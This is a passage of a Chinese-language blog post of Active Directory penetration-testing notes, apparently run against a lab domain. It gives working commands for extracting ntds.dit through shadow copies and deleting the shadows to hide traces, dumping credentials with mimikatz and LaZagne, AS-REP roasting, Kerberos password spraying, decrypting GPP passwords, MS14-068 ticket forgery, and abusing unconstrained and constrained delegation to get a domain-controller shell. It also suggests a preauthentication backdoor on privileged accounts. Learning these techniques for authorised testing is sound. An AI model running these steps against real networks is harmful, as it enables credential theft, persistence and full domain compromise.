<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#②利用vssadmin提取ntds.dit</span></span><br><span class="line"><span class="comment">#创建c盘卷影拷贝</span></span><br><span class="line">vssadmin create shadow /for=c:</span><br><span class="line"><span class="comment">#复制ntds.dit</span></span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit</span><br><span class="line"><span class="comment">#导出system.hive文件到注册表 </span></span><br><span class="line">copy \\?\GLOBALLROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\ntds.dit reg sava hklm\system system.hive </span><br><span class="line"><span class="comment">#删除卷影，隐藏痕迹</span></span><br><span class="line">vssadmin delete shadows /for=C: /quiet</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230922212608100.png" alt="image-20230922212608100" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230922212813178.png" alt="image-20230922212813178" style="zoom:80%;" />



<h2 id="本机信息搜集"><a href="#本机信息搜集" class="headerlink" title="本机信息搜集"></a>本机信息搜集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1、用户列表  net user /domain</span><br><span class="line">windows用户列表 分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户</span><br><span class="line"></span><br><span class="line">2.进程列表  tasklist /svc</span><br><span class="line">分析杀毒软件/安全监控工具等 邮件客户端 VPN ftp等</span><br><span class="line"></span><br><span class="line">3.服务列表	tasklist /svc</span><br><span class="line">与安全防范工具有关服务[判断是否可以手动开关等] 存在问题的服务[权限/漏洞]</span><br><span class="line"></span><br><span class="line">4.端口列表	netstat -ano</span><br><span class="line">开放端口对应的常见服务/应用程序[匿名/权限/漏洞等] 利用端口进行信息收集</span><br><span class="line"></span><br><span class="line">5.补丁列表	systeminfo</span><br><span class="line">分析 Windows 补丁 第三方软件[Java/Oracle/Flash 等]漏洞</span><br><span class="line"></span><br><span class="line">6.本机共享	smbclient -L ip  </span><br><span class="line">		   net user \\ip\c$</span><br><span class="line">本机共享列表/访问权限 本机访问的域共享/访问权限</span><br><span class="line"></span><br><span class="line">7.本用户习惯分析</span><br><span class="line">历史记录 收藏夹 文档等</span><br></pre></td></tr></table></figure>

<h3 id="获取当前用户密码Windows"><a href="#获取当前用户密码Windows" class="headerlink" title="获取当前用户密码Windows"></a>获取当前用户密码Windows</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mimikatz</span></span><br><span class="line"><span class="comment">#高版本无法抓取明文密码</span></span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line"><span class="comment">#Invoke-WCMDump</span></span><br><span class="line"></span><br><span class="line">mimiDbg</span><br><span class="line"></span><br><span class="line">LaZagne</span><br><span class="line"></span><br><span class="line">NirLauncher</span><br><span class="line"></span><br><span class="line">quarkspwdump</span><br></pre></td></tr></table></figure>



<h3 id="获取当前用户密码Linux"><a href="#获取当前用户密码Linux" class="headerlink" title="获取当前用户密码Linux"></a>获取当前用户密码Linux</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimipenguin</span><br><span class="line">LaZagne</span><br></pre></td></tr></table></figure>



<h2 id="扩散信息搜集"><a href="#扩散信息搜集" class="headerlink" title="扩散信息搜集"></a>扩散信息搜集</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#端口扫描</span></span><br><span class="line">nmap</span><br><span class="line">masscan</span><br><span class="line"></span><br><span class="line"><span class="comment">#内网拓扑分析</span></span><br><span class="line">DMZ</span><br><span class="line">管理网</span><br><span class="line">生产网</span><br><span class="line">测试网</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h3 id="常见信息搜集命令"><a href="#常见信息搜集命令" class="headerlink" title="常见信息搜集命令"></a>常见信息搜集命令</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all ------&gt; 查询本机 IP 段，所在域等</span><br><span class="line"></span><br><span class="line">net user ------&gt; 本机用户列表</span><br><span class="line">net localgroup administrators ------&gt; 本机管理员[通常含有域用户]</span><br><span class="line">net user /domain ------&gt; 查询域用户</span><br><span class="line">net group /domain ------&gt; 查询域里面的工作组</span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain ------&gt; 查询域管理员用户组</span><br><span class="line">net localgroup administrators /domain ------&gt; 登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user001 /add -----&gt;域用户添加到本机</span><br><span class="line">net group <span class="string">&quot;Domain controllers&quot;</span> -------&gt; 查看域控制器(如果有多台)</span><br><span class="line">net view ------&gt; 查询同一域内机器列表</span><br><span class="line">net view /domain ------&gt; 查询域列表</span><br><span class="line">net view /domain:domainname</span><br><span class="line"></span><br><span class="line">dsquery computer domainroot -<span class="built_in">limit</span> 65535 &amp;&amp; net group <span class="string">&quot;domain</span></span><br><span class="line"><span class="string">computers&quot;</span> /domain ------&gt; 列出该域内所有机器名</span><br><span class="line">dsquery user domainroot -<span class="built_in">limit</span> 65535 &amp;&amp; net user /domain------&gt;列出该域内所有用户名</span><br><span class="line">dsquery subnet ------&gt;列出该域内网段划分</span><br><span class="line">dsquery group &amp;&amp; net group /domain ------&gt;列出该域内分组 </span><br><span class="line">dsquery ou ------&gt;列出该域内组织单位 </span><br><span class="line">dsquery server &amp;&amp; net time /domain------&gt;列出该域内域控制器 </span><br><span class="line"></span><br><span class="line">NETBIOS 信息收集</span><br><span class="line">SMB 信息收集</span><br><span class="line">空会话信息收集</span><br><span class="line">漏洞信息收集等</span><br></pre></td></tr></table></figure>



<h3 id="域用户枚举"><a href="#域用户枚举" class="headerlink" title="域用户枚举"></a>域用户枚举</h3><p>在kerberos的AS-REQ认证中当cname值中的用户不存在时返回包提示<code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>，所以当我们没有域凭证时，可以通过<code>Kerberos pre-auth</code>从域外对域用户进行用户枚举。</p>
<p>使用工具<a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230927114433410.png" alt="image-20230927114433410" style="zoom:80%;" />

<h3 id="AS-REPRoasting"><a href="#AS-REPRoasting" class="headerlink" title="AS-REPRoasting"></a>AS-REPRoasting</h3><p>对于域用户，如果设置了选项<code>Do not require Kerberos preauthentication</code>(不要求Kerberos预身份认证)，此时向域控制器的88端口发送AS-REQ请求，对收到的AS-REP内容重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用<code>hashcat</code>或是<code>john</code>对其破解，最终获得该用户的明文口令。<strong>默认情况下该配置不会设置</strong>。</p>
<p>使用impacket工具包<code>GetNPUsers.py</code>发现不做Kerberos预认证用户：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py -dc-ip 192.168.17.134 0ne.<span class="built_in">test</span>/zhangsan:zs@123456</span><br><span class="line">GetNPUsers.py -dc-ip 192.168.17.134 0ne.<span class="built_in">test</span>/zhangsan:zs@123456 -format john -outputfile NPhashes</span><br><span class="line">john --wordlist=/usr/share/wordlists/FastPwds.txt NPhashes</span><br><span class="line"></span><br><span class="line"><span class="comment">#没有域凭证时,可以用户名枚举来查找未设置预认证的账号</span></span><br><span class="line">GetNPUsers.py -dc-ip 192.168.1.250 y5neko.com/ -usersfile users.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230927180448477.png" alt="image-20230927180448477" style="zoom: 67%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230927180823906.png" alt="image-20230927180823906" style="zoom:80%;" />

<p>可以看到，通过user2普通账户扫描到了域管理员user1</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230927181320269.png" alt="image-20230927181320269" style="zoom:80%;" />

<p>无域凭证</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230927181836802.png" alt="image-20230927181836802" style="zoom:80%;" />

<p>该配置<code>不要求Kerberos预身份认证</code>默认不启用，可以给域内高权限用户配置该选项作为后门。</p>
<h3 id="密码喷洒攻击"><a href="#密码喷洒攻击" class="headerlink" title="密码喷洒攻击"></a>密码喷洒攻击</h3><p>在kerberos的AS-REQ认证中当用户名存在时，密码正确或者错误返回包结果不一样，所以可以尝试爆破密码。</p>
<p>通常爆破就是用户名固定，爆破密码，但是密码喷洒，是用固定的密码去跑用户名。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute_linux_amd64 passwordspray --dc 192.168.1.250 -d y5neko.com user.txt win71@123</span><br></pre></td></tr></table></figure>

<p>单用户爆破密码：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute_linux_amd64 bruteuser --dc 192.168.1.250 -d y5neko.com passwords.txt user1</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230927183050584.png" alt="image-20230927183050584" style="zoom:80%;" />



<h3 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h3><p>使用<code>PsLoggendon.exe</code>定位域管理员：<br>可以查看指定用户域内登录过的主机或是某主机登录过的用户</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PsLoggendon.exe -accepteula administrator</span><br><span class="line">PsLoggendon.exe -accepteula \\DC2012</span><br></pre></td></tr></table></figure>



<h3 id="AdFind"><a href="#AdFind" class="headerlink" title="AdFind"></a>AdFind</h3><p>列出域控制器名称：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc dclist</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230928165506180.png" alt="image-20230928165506180" style="zoom:80%;" />

<p>查看域控版本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -schema -s base objectversion</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230928165546832.png" alt="image-20230928165546832" style="zoom:80%;" />

<p>查询当前域中在线的计算机(只显示名称和操作系统)：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc computers_active name operatingSystem</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230928165623233.png" alt="image-20230928165623233" style="zoom:67%;" />

<p>查询当前域中所有计算机（只显示名称和操作系统）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -f <span class="string">&quot;objectcategory=computer&quot;</span> name operatingSystem</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230928165824589.png" alt="image-20230928165824589" style="zoom:80%;" />

<p>查询当前域内所有用户：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -<span class="built_in">users</span> name</span><br></pre></td></tr></table></figure>

<p>查询域内所有GPO信息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc gpodmp</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230928170018338.png" alt="image-20230928170018338" style="zoom: 67%;" />

<p>查看指定域（y5neko.com）内非约束委派主机：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b <span class="string">&quot;DC=y5neko,DC=com&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span>  cn</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230928170251701.png" alt="image-20230928170251701" style="zoom:67%;" />













<h2 id="打域控的方法"><a href="#打域控的方法" class="headerlink" title="打域控的方法"></a>打域控的方法</h2><h3 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h3><p>SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。</p>
<p><strong>组策略</strong></p>
<p>组策略全称Group Policy Preferences，也就是GPP，常说的GPP漏洞就是这里的MS14-025漏洞。什么情况下会使用到组策略，系统中我们可以新建用户，默认最高权限账号为administrator，一般在域环境中管理员为了限制大家的权限不会给与administrator权限，这个时候就需要使用GPP来更改所有主机的内置管理员账号密码（user@123）</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230926151408415.png" alt="image-20230926151408415" style="zoom: 50%;" />

<p><strong>原理</strong></p>
<p>我们提到过组策略可以批量更改所有主机的内置管理员账号密码，在新建完组策略，策略对象并添加本地账号密码后，会再域服务下面目录会生成这几个文件</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230926152037957.png" alt="image-20230926152037957" style="zoom:80%;" />

<p>id正好对应每个组策略的id</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230926152155772.png" alt="image-20230926152155772" style="zoom:50%;" />

<p>进入目录<code>C:\Windows\SYSVOL\domain\Policies\&#123;0AEAF235-B686-426D-B72C-34C64A71DF70&#125;\Machine\Preferences\Groups</code>下</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230926152312453.png" alt="image-20230926152312453" style="zoom: 67%;" />

<p>其中cpassword的值就是AES加密后的密码密文，正好微软公布了加密密钥</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/a25b8816507046fb93c8ce1ec0fca13d.png" alt="img" style="zoom:50%;" />

<p>使用kali自带工具直接解密</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpp-decrypt UVDbExfBIja6+i3M8Rwmwp7om2zdGbS12p4N/pl/AX8</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230926153336209.png" alt="image-20230926153336209" style="zoom:80%;" />

<p><strong>结论</strong></p>
<p>域管理员在使用组策略批量管理域内主机时，如果配置组策略的过程中需要填入密码，那么该密码会被保存到共享文件夹\SYSVOL下，默认所有域内用户可访问，虽然被加密，但很容易被解密</p>
<p>能打域控是因为某些情况下管理员可能会用相同的密码，才有几率可以通过单一密码打下域控，就算不能打下域控也可以通过命令行切换本地管理员账户，达成脱域的攻击</p>
<p><strong>防御</strong></p>
<p>补丁KB2962486</p>
<h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14_068"></a>MS14_068</h3><p>1、获取域普通用户的账号密码<br>2、获取域普通用户的sid<br>3、服务器未打KB3011780补丁<br>4、域控服务器的IP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user1:win71@123</span><br><span class="line">S-1-5-21-1493762544-529832293-733686757-1112</span><br><span class="line">192.168.1.250</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230926170929931.png" alt="image-20230926170929931" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230926171005563.png" alt="image-20230926171005563" style="zoom:80%;" />

<p><strong>利用思路</strong></p>
<p>1、首先利用ms14-068提权工具生成伪造的kerberos协议认证证书（黄金票据）<br>2、利用mimikatz.exe将证书写入，从而提升为域管理员<br>3、测试是否能访问域控C盘目录，能访问则说明提升为域管理员<br>4、利用PsExec.exe获取域控shell，添加用户并将其加入域管理员组</p>
<p>得到黄金票据之后，通过mimikatz写入内存</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#提取kirbi格式的文件</span></span><br><span class="line">kerberos::clist <span class="string">&quot;20221114105328_default_192.168.254.133_windows.kerberos_896806.bin&quot;</span> /export</span><br><span class="line"></span><br><span class="line">kerberos::purge         //清空当前所有凭证</span><br><span class="line">kerberos::list          //查看当前凭证</span><br><span class="line">kerberos::ptc TGT_tidetest@tide.org.ccache   //将票据注入到内存中</span><br><span class="line"></span><br><span class="line">mimikatz.exe <span class="string">&quot;kerberos::ptc c:TGT_user1@Y5NEKO.COM.ccache&quot;</span> <span class="built_in">exit</span></span><br><span class="line">net use k: \pentest.comc$</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230926203532609.png" alt="image-20230926203532609" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230926203548981.png" alt="image-20230926203548981" style="zoom:80%;" />



<h2 id="域委派攻击"><a href="#域委派攻击" class="headerlink" title="域委派攻击"></a>域委派攻击</h2><p>域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。需要注意的是在域内可以委派的账户有两种，一种是<strong>主机账户</strong>，另一种是<strong>服务账户</strong>(域用户通过注册SPN也可以成为服务账号)。<br>Kerberos委派主要分为三种：</p>
<p><strong>非约束委派攻击</strong>：拿到非约束委派的主机权限，如能配合打印机BUG。则可以直接拿到域控权限。<br><strong>约束委派攻击</strong>：拿到配置了约束委派的域账户或主机服务账户，就能拿到它委派服务的administrator权限。<br><strong>基于资源的约束委派攻击</strong>：1.如果拿到将主机加入域内的域账号，即使是普通账号也可以拿到那些机器的system权限。 2.“烂番茄”本地提权</p>
<h3 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>当域用户访问域内某服务时，如果该服务开启了非约束委派，用户会主动将自己已转发的TGT发送服务，而该服务会将用户的TGT保存在内存以备下次重用，然后服务就可以利用该已转发的TGT以用户的身份访问该用户能访问的服务。非约束委派的安全问题就是如果我们找到配置了非约束委派的主机，并且通过一定手段拿下该主机的权限，我们就可以拿到所有访问过该主机用户的TGT。</p>
<p><strong>配置非约束委派</strong></p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230928164205514.png" alt="image-20230928164205514" style="zoom:67%;" />

<p><strong>查找非约束委派主机</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b <span class="string">&quot;DC=y5neko,DC=com&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span>  cn</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20230928170523309.png" alt="image-20230928170523309" style="zoom:80%;" />

<p><strong>利用</strong></p>
<p>当我们在域内拿到一台配置了非约束委派的主机后，就可以使用mimikatz导出所有票据，若是有其他用户访问过该主机，那么我们就可以通过ptt获取该用户权限。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::tickets /export&quot;</span> <span class="built_in">exit</span></span><br><span class="line"><span class="comment">#之后就可以带着票据任意使用了</span></span><br><span class="line">kerberos::ptt [0;77987]-2-0-40e10000-Administrator@krbtgt-Y5NEKO.COM.kirbi</span><br><span class="line">psexec64.exe \\DC.y5neko.com -accepteula -s cmd</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231006172913475.png" alt="image-20231006172913475" style="zoom: 67%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231006173805088.png" alt="image-20231006173805088" style="zoom:67%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231006175725584.png" alt="image-20231006175725584" style="zoom:67%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231006180441869.png" alt="image-20231006180441869" style="zoom:80%;" />

<h3 id="非约束委派-Spooler打印机服务"><a href="#非约束委派-Spooler打印机服务" class="headerlink" title="非约束委派+Spooler打印机服务"></a>非约束委派+Spooler打印机服务</h3><p>普通的非约束委派攻击方式在实战情况下，除非域管理员连接过该服务，否则十分鸡肋，而在特定情况下，可以利用splooer服务让域控主动连接。</p>
<p>利用原理：利用 Windows 打印系统远程协议 (MS-RPRN) 中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex) 方法强制任何运行了 Spooler 服务的计算机以通过 Kerberos 或 NTLM 对攻击者选择的目标进行身份验证。</p>
<p>也就是说攻击者控制一个开启了非约束委派的主机账户，当域控开启Print Spooler服务时，攻击者可以主动要求域控访问该主机服务器，进而获取DC的TGT</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231007204829084.png" alt="image-20231007204829084" style="zoom:80%;" />

<p>Poc：<a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a></p>
<p>接着按照非约束委派的攻击方式即可</p>
<h3 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h3><p>由于非约束委派的不安全性，微软在windows server2003中引入了约束委派，对Kerberos协议进行了拓展，引入了S4U。其中S4U支持两个子协议：</p>
<ul>
<li>Service for User to Self(<strong>S4U2self</strong>)</li>
<li>Service for User to Proxy(<strong>S4U2proxy</strong>)</li>
</ul>
<p>这两个扩展都允许服务代表用户从KDC请求票证。S4U2self可以代表自身请求针对其自身的Kerberos服务票据(ST)；S4U2proxy可以以用户的名义请求其它服务的ST，约束委派就是限制了S4U2proxy扩展的范围。</p>
<p>不同于允许委派所有服务的⾮约束委派，约束委派的⽬的是在模拟⽤户的同时，限制委派机器&#x2F;帐户对特定服务的访问。</p>
<h4 id="委派流程"><a href="#委派流程" class="headerlink" title="委派流程"></a>委派流程</h4><blockquote>
<p>user访问service1，向DC发起kerberos认证，域控返回user的TGT和ST1票据，user使用ST1票据对service1进行访问；如果配置了service1到service2的约束委派，则service1能使用S4U2Proxy协议将用户发给自己的可转发的ST1票据以用户的身份发给DC；DC返回service1一个用来访问service2的ST2票据,这样service1就能以用户的身份对service2发起访问。</p>
</blockquote>
<p>S4U2Self和S4U2proxy的请求过程：</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231007211239284.png" alt="image-20231007211239284" style="zoom: 67%;" />

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#S4U2self</span></span><br><span class="line">1. 用户向service1发出请求。用户已通过身份验证，但service1没有用户的授权数据。通常，这是由于身份验证是通过Kerberos以外的其他方式验证的。</span><br><span class="line">2. 通过S4U2self扩展以用户的名义向KDC请求用于访问service1的ST1。</span><br><span class="line">3. KDC返回给Service1一个用于用户验证Service1的ST1，该ST1可能包含用户的授权数据</span><br><span class="line">4. service1可以使用ST中的授权数据来满足用户的请求，然后响应用户</span><br><span class="line"><span class="comment">#尽管S4U2self service1提供有关用户的信息，但S4U2self不允许service1代表用户发出其他服务的请求，这时候就轮到S4U2proxy发挥作用了</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#S4U2proxy</span></span><br><span class="line">5. 用户向service1发出请求，service1需要以用户身份访问service2上的资源。</span><br><span class="line">6. service1以用户的名义向KDC请求用户访问service2的ST2</span><br><span class="line">7. 如果请求中包含PAC，则KDC通过检查PAC的签名数据来验证PAC ，如果PAC有效或不存在，则KDC返回ST2给service1，但存储在ST2的cname和crealm字段中的客户端身份是用户的身份，而不是service1的身份。</span><br><span class="line">8. service1使用ST2以用户的名义向service2发送请求，并判定用户已由KDC进行身份验证</span><br><span class="line">9. service2响应步骤8的请求。</span><br><span class="line">10. service1响应用户对步骤5中的请求。</span><br></pre></td></tr></table></figure>

<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>由于服务用户只能获取某个用户（或主机）的服务的ST1而非TGT ， 所以只能模拟用户访问特定的服务 ；但是如果能够拿到约束委派用户（或主机）的明文密码或hash，那么就可以伪造S4U的请求，伪装成服务用户以任意用户的权限申请访问指定服务的ST2</p>
<p>此外，我们不仅可以访问约束委派配置中用户可以模拟的服务，还可以访问使用与模拟帐户权限允许的任何服务。 (因为未检查SPN，只检查权限)。 比如，如果我们能够访问CIFS服务，那么同样有权限访问HOST服务。注意如果我们有权限访问到DC的LDAP服务，则有足够的权限去执行DCSync.</p>
<p><strong>配置约束委派</strong></p>
<p>首先新建一个专门用于约束委派的账号，然后使用setspn命令注册服务账号</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A 服务名称/主机名.域名 域账号</span><br><span class="line">setspn -U -A yueshu_test/y5neko.com yueshu</span><br></pre></td></tr></table></figure>

<p>接着设置委派即可</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231007215744129.png" alt="image-20231007215744129" style="zoom:67%;" />

<p><strong>查找约束委派账户</strong></p>
<p>可以使用AdFind工具</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查询约束委派用户</span></span><br><span class="line">AdFind.exe -b <span class="string">&quot;DC=y5neko,DC=com&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds-allowedtodelegateto</span><br><span class="line"><span class="comment">#查询约束委派主机</span></span><br><span class="line">AdFind.exe -b <span class="string">&quot;DC=y5neko,DC=com&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231007220143871.png" alt="image-20231007220143871" style="zoom:80%;" />

<p>也可以使用impacket工具包<code>findDelegation.py</code>找出所有的委派配置</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findDelegation.py -dc-ip 192.168.1.250 -target-domain y5neko.com y5neko.com/user1:win71@123</span><br></pre></td></tr></table></figure>

